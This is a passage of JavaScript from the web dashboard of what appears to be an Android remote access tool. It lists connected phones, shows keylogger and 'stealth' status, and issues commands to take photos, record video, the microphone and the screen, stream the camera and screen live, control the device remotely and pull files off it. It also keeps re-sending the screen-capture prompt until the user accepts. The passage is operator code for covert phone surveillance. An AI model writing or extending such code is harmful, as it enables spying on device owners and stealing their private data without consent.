  if(name==='control'){ if(!ctrlActive) ctrlStart(); }
  else { if(ctrlActive) ctrlStop(); }
  if(name==='overview'){ loadOverview(); }
  if(name==='session'){ loadSessionEvents(); }
  if(name==='monitor'){ loadWifiHistory(); }
}
document.querySelectorAll('.tab').forEach(t=> t.addEventListener('click',()=>switchTab(t.dataset.tab)));

function applyTheme(theme){
  document.documentElement.setAttribute('data-theme', theme==='light'?'light':'dark');
  const btn = $('theme-toggle'); if(btn) btn.textContent = theme==='light'?'☀':'🌙';
  try{ localStorage.setItem('theme', theme); }catch(_){}
}
(function initTheme(){ let saved='dark'; try{ saved=localStorage.getItem('theme')||'dark'; }catch(_){} applyTheme(saved); })();
$('theme-toggle').addEventListener('click', ()=>{ const cur=document.documentElement.getAttribute('data-theme'); applyTheme(cur==='light'?'dark':'light'); });
setInterval(()=>{ const d=new Date(); const el=$('clock'); if(el) el.textContent=d.toTimeString().slice(0,8); }, 1000);
$('menu-toggle').addEventListener('click', ()=>{ $('sidebar').classList.toggle('collapsed'); });
$('client-search').addEventListener('input', e=>{ clientFilter=e.target.value.toLowerCase(); renderClients(allClients); });
$('logout-btn').addEventListener('click', async ()=>{ if(!confirm('Sign out?')) return; try{ await fetch('/api/logout',{method:'POST'}); }catch(_){} location.href='/login'; });
$('pw-btn').addEventListener('click', ()=>{ $('pw-old').value=''; $('pw-new').value=''; $('pw-new2').value=''; const m=$('pw-msg'); m.classList.remove('show','ok','err'); $('pw-modal').classList.add('show'); });
function closePwModal(){ $('pw-modal').classList.remove('show'); }
$('pw-modal').addEventListener('click', e=>{ if(e.target===$('pw-modal')) closePwModal(); });
async function savePw(){
  const oldPw=$('pw-old').value, newPw=$('pw-new').value, newPw2=$('pw-new2').value;
  const m=$('pw-msg'); m.className='msg';
  if(!oldPw||!newPw||!newPw2){ m.textContent='Fill in all fields'; m.classList.add('show','err'); return; }
  if(newPw!==newPw2){ m.textContent='New passwords do not match'; m.classList.add('show','err'); return; }
  if(newPw.length<4){ m.textContent='New password too short'; m.classList.add('show','err'); return; }
  const btn=$('pw-save'); btn.disabled=true; btn.textContent='Saving…';
  try{
    const r = await api('/api/change-password', {old:oldPw, new:newPw});
    if(r.ok){ m.textContent='Password changed — redirecting…'; m.classList.add('show','ok'); setTimeout(()=>{location.href='/login';},1200); }
    else { m.textContent=r.error||'Failed'; m.classList.add('show','err'); }
  }catch(e){ m.textContent='Error: '+e.message; m.classList.add('show','err'); }
  finally{ btn.disabled=false; btn.textContent='Save'; }
}

function startUptime(secs){ clientUptimeBase=Date.now()-(secs*1000); if(uptimeTimer) clearInterval(uptimeTimer); const tick=()=>{ if(!clientUptimeBase){ $('hero-uptime').textContent='—'; return; } const sec=Math.floor((Date.now()-clientUptimeBase)/1000); $('hero-uptime').textContent=fmtDuration(sec); }; tick(); uptimeTimer=setInterval(tick,1000); }
function stopUptime(){ if(uptimeTimer) clearInterval(uptimeTimer); clientUptimeBase=0; $('hero-uptime').textContent='—'; }

function renderClients(list){
  allClients=list||[];
  const ul=$('client-list'); ul.innerHTML='';
  const filtered = clientFilter ? allClients.filter(c => (c.id||'').toLowerCase().includes(clientFilter) || (c.model||'').toLowerCase().includes(clientFilter) || (c.display_name||'').toLowerCase().includes(clientFilter) || ((c.tags||[]).join(' ')).toLowerCase().includes(clientFilter)) : allClients;
  $('client-count').textContent = allClients.length;
  $('sf-count').textContent = allClients.length;
  $('sf-active').textContent = activeId || '—';
  if(!filtered.length){ ul.innerHTML='<li class="no-clients">'+(clientFilter?'no matches':'no clients connected')+'</li>'; return; }
  for(const c of filtered){
    const li=document.createElement('li');
    li.className='client-item'+(c.id===activeId?' active':'');
    const netInfo = (c.ip && c.port) ? '<span class="tag">'+esc(c.ip)+':'+esc(c.port)+'</span>' : '';
    const screenTag = (c.screen === false) ? '<span class="tag" style="background:rgba(255,122,133,.2);color:var(--red)">📸 no screen</span>' : (c.screen === true ? '<span class="tag" style="background:rgba(110,231,165,.15);color:var(--green)">📸 ok</span>' : '');
    const displayName = c.display_name ? '<span class="display-name">'+esc(c.display_name)+'</span>' : '';
    const tagsHtml = (Array.isArray(c.tags) && c.tags.length)
      ? '<div class="sidebar-tags">' + c.tags.map(t => '<span class="tag-chip">'+esc(t)+'</span>').join('') + '</div>'
      : '';
    li.innerHTML = '<div class="cid"><span class="dot"></span>' + displayName + '<span class="name">'+esc(c.id)+'</span></div>'
      + '<div class="meta"><span class="tag">'+esc(c.model||'?')+'</span><span class="tag">A'+esc(c.android||'?')+'</span>'+netInfo+screenTag+'<span>'+c.secs+'s</span></div>'
      + tagsHtml;
    li.onclick=()=>selectClient(c.id);
    ul.appendChild(li);
  }
}

async function selectClient(id){
  if(id===activeId) return;
  if(liveActive) stopLive();
  if(ctrlActive) ctrlStop();
  const r = await api('/api/use', {id});
  if(!r.ok){ toast('Failed: '+(r.error||''),'err'); return; }
  activeId=id; currentCwd=r.cwd||''; appListData=[];
  toast('Active → '+id,'ok');
  const s = await api('/api/state');
  renderClients(s.clients); updateHero();
  if(currentTab==='dashboard') refreshInfo();
  if(currentTab==='files') fbRefresh();
  if(currentTab==='network'){ loadNet(); loadPerms(); }
  if(currentTab==='apps') loadApps(false);
  if(currentTab==='control'){ ctrlStart(); }
  const cl = (s.clients||[]).find(c=>c.id===id);
  if(cl) startUptime(cl.secs);
  metaLoadedFor = null;
  loadClientMeta(id);
  // Check projection state for new client
  setTimeout(checkProjectionState, 800);
}

function updateHero(){
  const cl = allClients.find(c=>c.id===activeId);
  $('bc-cur').textContent = activeId || 'no client selected';
  $('hero-id').textContent = activeId || 'No device selected';
  if(cl){
    $('hero-sub').textContent = (cl.model||'?')+' · Android '+(cl.android||'?')+(cl.ip?' · '+cl.ip+':'+cl.port:'');
    $('hero-build').textContent = cl.build||'—';
    $('hero-cwd').textContent = currentCwd||'—';
    $('hero-status').textContent = 'online';
    $('hero-status').style.background='rgba(110,231,165,.15)';
    $('hero-status').style.color='var(--green)';
  } else {
    $('hero-sub').textContent='Connect a client to begin';
    $('hero-build').textContent='—'; $('hero-cwd').textContent='—';
    $('hero-status').textContent='offline';
    $('hero-status').style.background=''; $('hero-status').style.color='';
  }
}

async function sendCmd(cmd, args, opts){
  opts=opts||{};
  const r = await api('/api/send', {cmd, args: args||[]});
  if(r.cwd!==undefined){ currentCwd=r.cwd; updateCwdUI(); }
  if(r.error && !opts.silent) toast(r.error,'err');
  return r;
}
async function sendLine(line, opts){
  opts=opts||{};
  const r = await api('/api/send', {line});
  if(r.cwd!==undefined){ currentCwd=r.cwd; updateCwdUI(); }
  if(r.error && !opts.silent) toast(r.error,'err');
  return r;
}
function updateCwdUI(){ $('di-cwd').textContent=currentCwd||'-'; $('hero-cwd').textContent=currentCwd||'—'; renderBreadcrumbs(); }
function renderBreadcrumbs(){
  const el = $('fb-breadcrumbs'); if(!el) return;
  const cwd = currentCwd||'/';
  const parts = cwd.split('/').filter(Boolean);
  let html = '<span class="crumb" onclick="fbJump(\'/\')">/</span>';
  let acc = '';
  for(let i=0;i<parts.length;i++){
    acc += '/'+parts[i];
    html += '<span>›</span><span class="crumb" onclick="fbJump(\''+esc(acc).replace(/'/g,"\\'")+'\')">'+esc(parts[i])+'</span>';
  }
  el.innerHTML = html;
}
async function fbJump(path){
  const r = await sendCmd('cd',[path]);
  if(r.error){ toast(r.error,'err'); return; }
  if(r.cwd) currentCwd=r.cwd;
  updateCwdUI(); fbRefresh();
}

async function refreshInfo(){
  if(!activeId) return;
  const r = await sendCmd('info',[],{silent:true});
  if(r.error){ toast(r.error,'err'); return; }
  try{
    const o = JSON.parse(r.output);
    $('di-id').textContent=o.id||'-';
    $('di-model').textContent=o.model||'-';
    $('di-android').textContent=o.android||'-';
    $('di-build').textContent=o.build||'-';
    $('di-root').textContent=o.root||'-';
    $('di-cwd').textContent=o.cwd||currentCwd||'-';
    if(o.cwd){ currentCwd=o.cwd; renderBreadcrumbs(); }
    const setStatus = (id, ok, onText, offText)=>{
      const el=$(id); el.innerHTML='<span class="status-dot '+(ok?'ok':'bad')+'"></span>'+(ok?(onText||'ready'):(offText||'not available'));
      el.className='value '+(ok?'ok':'bad');
    };
    setStatus('di-allfiles', !!o.allFiles, 'granted', 'not granted');
    setStatus('di-screencap', !!o.screenCapture, 'ready', 'not granted');
    setStatus('di-keylogger', !!o.keylogger, 'running', 'stopped');
    setStatus('di-notif', !!o.notifListener, 'enabled', 'not enabled');
    setStatus('di-usage', !!o.usageAccess, 'granted', 'not granted');
    setStatus('di-stealth', !!o.stealth, 'on', 'off');
  }catch(e){ console.warn('info parse', e); }
}

function startCountdown(seconds, label){
  stopCountdown();
  const ov=$('progress-overlay');
  $('progress-title').textContent=label;
  ov.classList.add('show');
  const total=Math.max(1,seconds);
  let remaining=total;
  const tick=()=>{
    $('progress-timer').textContent=remaining>0?remaining:'…';
    $('progress-bar').style.width=(100*(total-remaining)/total)+'%';
    if(remaining<=0){ if(captureTimer){clearInterval(captureTimer);captureTimer=null;} return; }
    remaining--;
  };
  tick(); captureTimer=setInterval(tick,1000);
}
function stopCountdown(){ if(captureTimer){clearInterval(captureTimer);captureTimer=null;} $('progress-overlay').classList.remove('show'); $('progress-bar').style.width='0%'; }

function loadGallery(){ try{ return JSON.parse(localStorage.getItem('captures')||'[]'); } catch(e){ return []; } }
function saveGallery(items){ try{ localStorage.setItem('captures', JSON.stringify(items.slice(0,100))); }catch(e){} }
function addCapture(name, size, kindHint, remote){
  const kind = kindHint||kindFromName(name);
  const items = loadGallery();
  items.unshift({name, size, kind, remote:!!remote, ts:Date.now()});
  saveGallery(items); renderGallery();
}
function renderGallery(){
  const items = loadGallery();
  const list = $('gallery-list');
  if(!items.length){ list.innerHTML='<div class="gallery-empty">No captures yet</div>'; return; }
  list.innerHTML='';
  items.forEach((it, i)=>{
    const div=document.createElement('div'); div.className='gallery-item';
    const url='/download/'+encodeURIComponent(it.name);
    const kind = it.kind||kindFromName(it.name);
    const thumb=document.createElement('div'); thumb.className='gallery-thumb';
    const badge=document.createElement('div');
    badge.className='thumb-badge '+(it.remote?'device':badgeClass(kind));
    badge.textContent = it.remote?'device':kind;
    thumb.appendChild(badge);
    if(it.remote || kind==='enc' || kind==='archive'){
      const ic=document.createElement('div'); ic.className='thumb-icon'; ic.textContent=iconForKind(kind); thumb.appendChild(ic);
    } else if(kind==='image'){
      const img=document.createElement('img'); img.src=url; img.alt=it.name; thumb.appendChild(img);
      thumb.onclick=()=>openLightbox(url,'image');
    } else if(kind==='video'){
      const v=document.createElement('video'); v.src=url; v.muted=true; v.preload='metadata'; thumb.appendChild(v);
      thumb.onclick=()=>openLightbox(url,'video');
    } else {
      const ic=document.createElement('div'); ic.className='thumb-icon'; ic.textContent=iconForKind(kind); thumb.appendChild(ic);
    }
    const info=document.createElement('div'); info.className='gallery-info';
    const nameEl=document.createElement('div'); nameEl.className='g-name'; nameEl.textContent=it.name;
    const metaEl=document.createElement('div'); metaEl.className='g-meta'; metaEl.textContent=(it.size?fmtSize(it.size)+' · ':'')+timeAgo(it.ts)+(it.remote?' · on device':'');
    const acts=document.createElement('div'); acts.className='gallery-acts';
    if(it.remote){
      const pull=document.createElement('button'); pull.textContent='⇣ Pull'; pull.onclick=(e)=>{ e.stopPropagation(); pullRemote(it.name, i); };
      acts.appendChild(pull);
    } else {
      const a=document.createElement('a'); a.href=url; a.download=it.name; a.textContent='⬇ Save';
      a.onclick=e=>e.stopPropagation(); acts.appendChild(a);
    }
    const rm=document.createElement('button'); rm.className='rm'; rm.textContent='✕';
    rm.onclick=(e)=>{ e.stopPropagation(); const arr=loadGallery(); arr.splice(i,1); saveGallery(arr); renderGallery(); };
    acts.appendChild(rm);
    info.appendChild(nameEl); info.appendChild(metaEl); info.appendChild(acts);
    div.appendChild(thumb); div.appendChild(info);
    list.appendChild(div);
  });
}
async function pullRemote(remotePath, idx){
  toast('Pulling '+remotePath+'…');
  const r = await api('/api/get', {remote: remotePath});
  if(r.error){ toast(r.error,'err'); return; }
  const items=loadGallery();
  if(idx<items.length){
    items[idx].name=r.name; items[idx].size=r.size;
    items[idx].kind=kindFromName(r.name); items[idx].remote=false; items[idx].ts=Date.now();
    saveGallery(items); renderGallery();
  }
  toast('Pulled '+r.name+' ('+fmtSize(r.size)+')','ok');
}
function clearGallery(){ if(!confirm('Clear gallery?')) return; localStorage.removeItem('captures'); renderGallery(); }
function openLightbox(url, kind){
  const lb=$('lightbox'), c=$('lightbox-content');
  c.innerHTML='';
  if(kind==='image'){ const img=document.createElement('img'); img.src=url; c.appendChild(img); }
  else if(kind==='video'){ const v=document.createElement('video'); v.src=url; v.controls=true; v.autoplay=true; c.appendChild(v); }
  lb.classList.add('show');
}
function closeLightbox(e){ if(e) e.stopPropagation(); $('lightbox').classList.remove('show'); $('lightbox-content').innerHTML=''; }

function handleMedia(r, kindHint){
  stopCountdown();
  if(!r){ toast('no response','err'); return; }
  if(r.error){ toast(r.error,'err',5000); addLog('✗ '+r.error,'err'); setMediaStatus('✗ '+r.error,'var(--red)'); return; }
  if(r.saved_name){
    const kind=kindHint||kindFromName(r.saved_name);
    const size=r.saved_size||r.size||0;
    addCapture(r.saved_name, size, kind, false);
    const msg=r.output||('Saved '+r.saved_name);
    toast(msg,'ok'); addLog('✓ '+msg,'connect'); setMediaStatus('✓ '+msg+' ('+fmtSize(size)+')','var(--green)');
    if(r.note) toast(r.note,'warn',5000);
    return;
  }
  if(r.filename){
    addCapture(r.filename, 0, kindHint, true);
    const msg='On device: '+r.filename+' — click "Pull"';
    toast(msg,'warn',6000); addLog('⚠ '+msg,'info'); setMediaStatus('⚠ '+msg,'var(--yellow)');
    return;
  }
  if(r.output){ toast(r.output,'ok'); addLog('✓ '+r.output,'connect'); setMediaStatus('✓ '+r.output,'var(--green)'); }
  if(r.note) toast(r.note,'warn',5000);
}

async function doPhoto(facing, name, btn){ const args=[facing||'back']; if(name) args.push(name); setMediaStatus('📷 capturing…','var(--cyan)'); toast('Capturing photo…'); addLog('📷 photo '+(facing||'back'),'info'); busy(btn,true); try{ const r = await sendCmd('photo',args,{silent:true}); handleMedia(r,'image'); } finally{ busy(btn,false); } }
async function doVideo(facing, secs, name, btn){ const args=[facing||'back']; if(name){args.push(name);args.push(String(secs));}else{args.push(String(secs));} addLog('🎥 video '+secs+'s','info'); setMediaStatus('🎥 recording ('+secs+'s)…','var(--cyan)'); startCountdown(secs,'Recording video'); busy(btn,true); try{ const r = await sendCmd('video',args,{silent:true}); handleMedia(r,'video'); } finally{ busy(btn,false); } }
async function doScreenshot(name, btn){ const args=name?[name]:[]; setMediaStatus('📸 taking screenshot…','var(--cyan)'); toast('Taking screenshot…'); addLog('📸 screenshot','info'); busy(btn,true); try{ const r = await sendCmd('screenshot',args,{silent:true}); handleMedia(r,'image'); } finally{ busy(btn,false); } }
async function doScreenrec(secs, name, btn){ const args=[String(secs)]; if(name) args.push(name); addLog('🎬 screenrec '+secs+'s','info'); setMediaStatus('🎬 recording screen ('+secs+'s)…','var(--cyan)'); startCountdown(secs,'Recording screen'); busy(btn,true); try{ const r = await sendCmd('screenrec',args,{silent:true}); handleMedia(r,'video'); } finally{ busy(btn,false); } }
async function doScreenrecAv(secs, name, btn){ addLog('🎞 screenrec_av '+secs+'s','info'); setMediaStatus('🎞 recording screen + audio ('+secs+'s)…','var(--cyan)'); startCountdown(secs,'Recording screen + audio'); busy(btn,true); try{ const r = await api('/api/screenrec/av', {secs, name: name||''}); handleMedia(r,'video'); } finally{ busy(btn,false); } }
async function doMicaudio(secs, name, btn){ const args=[String(secs)]; if(name) args.push(name); addLog('🎙 micaudio '+secs+'s','info'); setMediaStatus('🎙 recording audio ('+secs+'s)…','var(--cyan)'); startCountdown(secs,'Recording audio'); busy(btn,true); try{ const r = await sendCmd('micaudio',args,{silent:true}); handleMedia(r,'audio'); } finally{ busy(btn,false); } }

function dashFacing(){ const el=document.querySelector('#dash-cam-facing button.active'); return el?el.dataset.facing:'back'; }
function dashDuration(){ const v=parseInt($('dash-duration').value); return isNaN(v)?5:Math.max(1,Math.min(v,600)); }
function dashPhoto(btn){ doPhoto(dashFacing(), null, btn); }
function dashVideo(btn){ doVideo(dashFacing(), dashDuration(), null, btn); }
function dashScreenshot(btn){ doScreenshot(null, btn); }
function dashScreenrec(btn){ doScreenrec(dashDuration(), null, btn); }
function dashScreenrecAv(btn){ doScreenrecAv(dashDuration(), null, btn); }
function dashMicaudio(btn){ doMicaudio(dashDuration(), null, btn); }
function tabTakePhoto(btn){ doPhoto(camFacing, $('photo-name').value.trim()||null, btn); }
function tabRecordVideo(btn){ doVideo(camFacing, parseInt($('video-secs').value)||5, $('video-name').value.trim()||null, btn); }
function tabScreenshot(btn){ doScreenshot($('screenshot-name').value.trim()||null, btn); }
function tabScreenrec(btn){ doScreenrec(parseInt($('screenrec-secs').value)||5, $('screenrec-name').value.trim()||null, btn); }
function tabScreenrecAv(btn){ doScreenrecAv(parseInt($('screenrec-av-secs').value)||5, $('screenrec-av-name').value.trim()||null, btn); }
function tabMicaudio(btn){ doMicaudio(parseInt($('micaudio-secs').value)||5, $('micaudio-name').value.trim()||null, btn); }
document.querySelectorAll('#dash-cam-facing button').forEach(b=> b.addEventListener('click',()=>{ document.querySelectorAll('#dash-cam-facing button').forEach(x=>x.classList.remove('active')); b.classList.add('active'); }));
document.querySelectorAll('#cam-facing button').forEach(b=> b.addEventListener('click',()=>{ document.querySelectorAll('#cam-facing button').forEach(x=>x.classList.remove('active')); b.classList.add('active'); camFacing=b.dataset.facing; }));

// ═══ Live ═══
function setLiveUI(active){
  liveActive=active;
  const btn=$('live-btn'), img=$('live-img'), vid=$('live-vid'), ph=$('live-ph'), ind=$('live-ind'), stats=$('live-stats'), snap=$('live-snap');
  if(active){
    btn.textContent='⏹ Stop'; btn.classList.remove('primary'); btn.classList.add('danger');
    ph.style.display='none'; ind.classList.remove('paused');
    $('live-ind-text').textContent = liveMode==='photo'?'Live photo':liveMode==='video'?'Live camera':'Live screen';
    stats.style.display='flex'; snap.disabled=false;
    if(liveMode==='photo'){ img.style.display='block'; vid.style.display='none'; }
    else { img.style.display='none'; vid.style.display='block'; }
  } else {
    btn.textContent='▶ Start'; btn.classList.remove('danger'); btn.classList.add('primary');
    img.style.display='none'; img.removeAttribute('src');
    vid.style.display='none'; vid.pause(); vid.removeAttribute('src');
    ph.style.display='flex'; ind.classList.add('paused');
    $('live-ind-text').textContent='Offline'; stats.style.display='none'; snap.disabled=true;
    if(liveFpsTimer){ clearInterval(liveFpsTimer); liveFpsTimer=null; }
    liveFrameCount=0;
  }
}
document.querySelectorAll('#live-mode button').forEach(b=> b.addEventListener('click', async ()=>{
  document.querySelectorAll('#live-mode button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active'); liveMode=b.dataset.mode;
  const isPhoto = liveMode==='photo';
  $('lbl-fps').style.display=isPhoto?'inline':'none'; $('live-fps').style.display=isPhoto?'inline-block':'none';
  $('lbl-secs').style.display=isPhoto?'none':'inline'; $('live-secs').style.display=isPhoto?'none':'inline-block';
  $('live-facing').style.display=(liveMode==='screen')?'none':'inline-flex';
  if(liveMode==='screen' && activeId){
    const perm = await sendCmd('statusperm',[],{silent:true}).catch(()=>({}));
    let hasScreen = false;
    if(perm && perm.output){ try{ hasScreen = !!JSON.parse(perm.output).screenCapture; }catch(_){} }
    if(!hasScreen){
      toast('Requesting screen capture — confirm on device','warn',8000);
      addLog('📸 auto-requesting screen capture for live screen','info');
      await sendCmd('reqscreen',[],{silent:true}).catch(()=>{});
    }
  }
  if(liveActive){ stopLive(); setTimeout(startLive, 300); }
}));
document.querySelectorAll('#live-facing button').forEach(b=> b.addEventListener('click',()=>{
  document.querySelectorAll('#live-facing button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
  if(liveActive){ stopLive(); setTimeout(startLive, 300); }
}));
function toggleLive(){
  if(!activeId){ toast('No client selected','err'); return; }
  if(liveActive) stopLive();
  else { try{ startLive(); } catch(e){ toast('start failed: '+e.message,'err'); setLiveUI(false); } }
}
function startLive(){
  const facing = (document.querySelector('#live-facing button.active')||{}).dataset?.facing || 'back';
  liveFacing=facing;
  if(liveMode==='photo') startPhotoStream(facing);
  else if(liveMode==='video') startChunkStream('video', facing);
  else startChunkStream('screen', facing);
}
function stopLive(){
  if(liveMode==='photo') stopPhotoStream();
  else stopChunkStream();
  setLiveUI(false);
}
function startPhotoStream(facing){
  const fps=parseFloat($('live-fps').value)||1;
  const img=$('live-img');
  img.onerror = null; img.onload = null;
  liveFrameCount=0;
  img.src='/api/live?facing='+encodeURIComponent(facing)+
          '&fps='+encodeURIComponent(fps)+'&_='+Date.now();
  setLiveUI(true);
  addLog('🔴 live photo started ('+facing+' @ ~'+fps+' fps)','connect');
  toast('Live photo stream started','ok');
  img.onerror=()=>{ if(liveActive && liveMode==='photo'){ addLog('✗ photo stream ended','err'); toast('Photo stream ended','warn'); stopLive(); } };
  img.onload=()=>{ liveFrameCount++; };
  if(liveFpsTimer) clearInterval(liveFpsTimer);
  liveFpsTimer=setInterval(()=>{ const s=$('live-stats'); if(s) s.innerHTML='<span>'+liveFrameCount+'fps</span><span>MJPEG</span>'; liveFrameCount=0; }, 1000);
}
function stopPhotoStream(){ const img=$('live-img'); img.onerror=null; img.onload=null; img.removeAttribute('src'); addLog('⏹ live photo stopped','info'); }
async function startChunkStream(kind, facing){
  liveSession='s_'+Date.now().toString(36)+'_'+Math.random().toString(36).slice(2,8);
  liveVideoBuffer=[]; liveLoopRunning=true; liveRecording=true; livePlayed=0;
  setLiveUI(true);
  const label = kind==='video'?'camera video':'screen video';
  addLog('🔴 live '+label+' started'+(kind==='video'?' ('+facing+')':''),'connect');
  toast('Live '+label+' started','ok');
  if(liveFpsTimer) clearInterval(liveFpsTimer);
  liveFpsTimer=setInterval(updateChunkStats, 1000);
  chunkRecordWorker(kind, facing);
  chunkPlayWorker();
}
function stopChunkStream(){
  const sess = liveSession;
  liveLoopRunning = false; liveRecording = false;
  if(sess){
    api('/api/livevideo/stop', {session: sess}).catch(()=>{});
    api('/api/livescreen/stop', {session: sess}).catch(()=>{});
  }
  liveSession = null; liveVideoBuffer = [];
  const vid = $('live-vid');
  if(vid){ vid.onended = null; vid.onerror = null; try{ vid.pause(); }catch(_){} vid.removeAttribute('src'); }
  if(liveFpsTimer){ clearInterval(liveFpsTimer); liveFpsTimer = null; }
  addLog('⏹ live stream stopped','info');
}
async function chunkRecordWorker(kind, facing){
  const secs=parseInt($('live-secs').value)||2;
  const clipUrl = kind==='video'?'/api/livevideo/clip':'/api/livescreen/clip';
  while(liveRecording && liveLoopRunning){
    if(liveVideoBuffer.length>=3){ await new Promise(r=>setTimeout(r,200)); continue; }
    if(!activeId) break;
    let r;
    try{ const body = {session:liveSession, secs}; if(kind==='video') body.facing=facing; r = await api(clipUrl, body); }
    catch(e){ r = {error: String(e)}; }
    if(!liveRecording || !liveLoopRunning) break;
    if(r && r.ok){ liveVideoBuffer.push(r); }
    else if(r && r.error){ addLog('⚠ '+kind+' clip error: '+r.error,'err'); await new Promise(x=>setTimeout(x,1500)); }
  }
}
async function chunkPlayWorker(){
  const vid=$('live-vid');
  while(liveLoopRunning){
    if(!liveVideoBuffer.length){ await new Promise(r=>setTimeout(r,80)); continue; }
    if(!liveLoopRunning) break;
    const clip=liveVideoBuffer.shift();
    await new Promise(resolve=>{
      let done=false;
      const finish=()=>{ if(done) return; done=true; vid.onended=null; vid.onerror=null; resolve(); };
      vid.onended=finish;
      vid.onerror=()=>{ addLog('⚠ clip play error','err'); finish(); };
      vid.src=clip.url;
      const p=vid.play();
      if(p && p.catch) p.catch(()=>finish());
      setTimeout(finish, (clip.duration_ms||2000)+2500);
    });
    if(!liveLoopRunning) break;
    livePlayed++;
  }
}
function updateChunkStats(){ const buf=liveVideoBuffer.length; const played=livePlayed; livePlayed=0; $('live-stats').innerHTML='<span>buf '+buf+'</span><span>play '+played+'</span>'; }
function liveSnap(){
  if(liveMode!=='photo'){
    const vid=$('live-vid'); if(!vid || !vid.videoWidth){ toast('No video frame','warn'); return; }
    try{ const c=document.createElement('canvas'); c.width=vid.videoWidth; c.height=vid.videoHeight; c.getContext('2d').drawImage(vid,0,0);
      c.toBlob(blob=>{ const url=URL.createObjectURL(blob); const a=document.createElement('a'); const stamp=new Date().toISOString().replace(/[:.]/g,'-').slice(0,19); a.href=url; a.download='livestream_'+stamp+'.png'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url); toast('Frame saved','ok'); }, 'image/png');
    }catch(e){ toast('Snapshot failed: '+e.message,'err'); }
    return;
  }
  const img=$('live-img'); if(!img || !img.naturalWidth){ toast('No frame yet','warn'); return; }
  try{ const c=document.createElement('canvas'); c.width=img.naturalWidth; c.height=img.naturalHeight; c.getContext('2d').drawImage(img,0,0);
    c.toBlob(blob=>{ const url=URL.createObjectURL(blob); const a=document.createElement('a'); const stamp=new Date().toISOString().replace(/[:.]/g,'-').slice(0,19); a.href=url; a.download='livestream_'+stamp+'.png'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url); toast('Frame saved','ok'); }, 'image/png');
  }catch(e){ toast('Snapshot failed: '+e.message,'err'); }
}

// ═══ Control (MJPEG) ═══
async function ctrlStart(){
  if(!activeId){ toast('No client selected','err'); return; }
  if(ctrlActive || ctrlStarting) return;
  ctrlStarting = true;
  const st = $('ctrl-status');
  try{
    const rs = await api('/api/screen/size').catch(()=>({}));
    if(rs && rs.output){ try{ const o = JSON.parse(rs.output); ctrlSize.w = o.width||0; ctrlSize.h = o.height||0; }catch(_){} }
    const perm = await sendCmd('statusperm',[],{silent:true}).catch(()=>({}));
    let hasScreen = false;
    if(perm && perm.output){ try{ hasScreen = !!JSON.parse(perm.output).screenCapture; }catch(_){} }
    if(!hasScreen){
      showProjBanner('⚠ Screen capture not granted — control won\'t work');
      if(st){ st.textContent = '⏳ requesting screen capture — confirm on device...'; st.style.color='var(--yellow)'; }
      toast('Requesting screen capture — check your device','warn',8000);
      addLog('📸 auto-requesting screen capture','info');
      await sendCmd('reqscreen',[],{silent:true}).catch(()=>{});
      let granted = false; let retried = 0;
      for(let i=0; i<20; i++){
        await new Promise(r=>setTimeout(r, 2000));
        const p2 = await sendCmd('statusperm',[],{silent:true}).catch(()=>({}));
        if(p2 && p2.output){ try{ const pp = JSON.parse(p2.output); if(pp.screenCapture){ granted = true; break; } }catch(_){} }
        if((i+1) % 8 === 0 && retried < 2){
          retried++;
          addLog('📸 retry #' + retried + ' requesting screen capture','info');
          await sendCmd('reqscreen',[],{silent:true}).catch(()=>{});
        }
      }
      if(!granted){
        if(st){ st.textContent = '⚠ screen capture not granted — use top banner'; st.style.color='var(--red)'; }
        toast('Screen capture not granted after retries','err',8000);
        addLog('⚠ control start aborted — screen capture missing','warn');
        ctrlActive = false;
        return;
      }
      hideProjBanner();
      addLog('✓ screen capture granted','connect');
      toast('Screen capture granted ✓','ok');
    }
    ctrlActive = true;
    ctrlNetFrames = 0; ctrlStreamStart = Date.now();
    startCtrlStream();
    if(ctrlNetTimer) clearInterval(ctrlNetTimer);
    ctrlNetTimer = setInterval(updateCtrlStats, 1000);
    toast('Screen control ON','ok');
    addLog('🎮 control ON','info');
  } catch(e){
    toast('start failed: '+e.message,'err');
    addLog('✗ control start failed: '+e.message,'err');
  } finally { ctrlStarting = false; }
}
function startCtrlStream(){
  const img = $('ctrl-img');
  const url = '/api/screen/live?fps=' + ctrlFps + '&w=' + ctrlQuality.w + '&q=' + ctrlQuality.q + '&_=' + Date.now();
  img.onload = () => { ctrlNetFrames++; $('ctrl-offline').style.display = 'none'; };
  img.onerror = () => {
    if(ctrlActive){
      $('ctrl-offline').style.display = 'flex';
      $('ctrl-offline').innerHTML = '<div style="text-align:center;color:var(--red)">⚠ Stream error<br><span style="font-size:11px;color:var(--text-mute)">Retrying in 2s…</span></div>';
      setTimeout(() => { if(ctrlActive) startCtrlStream(); }, 2000);
    }
  };
  img.src = url;
  if(annotMode) syncAnnotCanvas();
}
function updateCtrlStats(){
  const badge = $('ctrl-fps-badge'), net = $('ctrl-net-stats');
  if(!badge) return;
  const uptime = Math.floor((Date.now() - ctrlStreamStart) / 1000);
  const fpsNow = ctrlNetFrames;
  badge.textContent = '● ' + fpsNow + ' fps · ' + ctrlQuality.q + 'q · ' + ctrlQuality.w + 'w';
  badge.style.color = fpsNow >= 3 ? 'var(--green)' : fpsNow >= 1 ? 'var(--yellow)' : 'var(--red)';
  if(net){ net.textContent = uptime + 's · ' + fpsNow + ' frames/s'; }
  ctrlNetFrames = 0;
}
function ctrlStop(){
  if(!ctrlActive) return;
  ctrlActive = false;
  const img = $('ctrl-img');
  if(img){ img.onload=null; img.onerror=null; img.removeAttribute('src'); }
  if(ctrlNetTimer){ clearInterval(ctrlNetTimer); ctrlNetTimer=null; }
  $('ctrl-offline').style.display = 'flex';
  $('ctrl-offline').innerHTML = '<div style="text-align:center">📱<br>Click <b>▶ Start</b> to begin</div>';
  const s = $('ctrl-status'); if(s){ s.textContent = 'stopped'; s.style.color = 'var(--text-dim)'; }
  $('ctrl-fps-badge').textContent = '—';
  addLog('🎮 control OFF','info');
}
document.querySelectorAll('#ctrl-quality button').forEach(b=> b.addEventListener('click', ()=>{
  document.querySelectorAll('#ctrl-quality button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
  ctrlQuality.q = parseInt(b.dataset.q) || 55;
  ctrlQuality.w = parseInt(b.dataset.w) || 720;
  if(ctrlActive){ startCtrlStream(); toast('Quality → ' + b.textContent.trim(),'ok',1500); }
}));
document.querySelectorAll('#ctrl-fps-set button').forEach(b=> b.addEventListener('click', ()=>{
